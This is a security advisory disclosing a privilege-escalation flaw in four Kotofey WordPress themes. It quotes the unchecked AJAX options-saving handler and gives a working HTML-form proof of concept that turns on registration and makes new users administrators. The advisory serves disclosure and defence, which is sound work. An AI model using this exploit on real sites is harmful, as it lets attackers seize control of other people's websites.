@@ -1,0 +1,65 @@
+Kotofey WordPress Themes Previlige Escalation
+
+Themes:
+Pont - Simpolio - Teardrop - Vernissage
+
+Description:
+suffers from a previlige escalation vulnerability, any authenticated user can trigger this vulnerability due to weak permissions checking. an attacker can update options( such as changing user's default role,registration state and others ), which may lead to executing commands/code on the server and taking over the website.
+
+Homepage:
+http://themeforest.net/item/pont-multipurpose-wordpress-theme/273142
+http://themeforest.net/item/vernissage-responsive-photographyportfolio-theme/4436204
+http://themeforest.net/item/simpolio-fullscreen-portfolio-blog-wp-theme/397050
+http://themeforest.net/item/teardrop-flexible-photo-portfolio-wp-theme/510900
+
+Affected Version:
+Simpolio 1.3.2
+Pont 1.5
+Teardrop 1.8.1
+Vernissage 1.2.8
+
+Vulnerability Scope:
+Previlige Escalation - RCE
+
+Authorization Required:
+User
+
+Vulnerability Code:
+
+  add_action('wp_ajax_of_ajax_post_action', array(&$this, 'ajax_callback'));
+  function ajax_callback(){
+    global $wpdb;
+
+    switch($_POST['type']){
+      case 'upload':
+        ...
+		
+      case 'image_reset':
+        ...
+
+      case 'reset':
+        ...
+		
+      case 'save':
+        foreach(wp_parse_args($_POST['data']) as $id=>$v) update_option($id, $v);
+        $this->options = $this->set_options();
+        break;
+    }
+    die();
+  }
+
+Proof of Concept:
+
+<form action="http://example.com/wp-admin/admin-ajax.php?action=of_ajax_post_action" method="post" >
+	<input name="type" value="save" type="hidden" />
+	<input name="data[users_can_register]" value="1" type="hidden" />
+	<input name="data[default_role]" value="administrator" type="hidden" />
+	<input type="submit" >
+</form>
+
+Fix:
+No Fix Available at The Moment.
+
+Time line:
+19, June 2015 - Notified Vendor ... No Reply
+26, June 2015 - Public Disclosure 
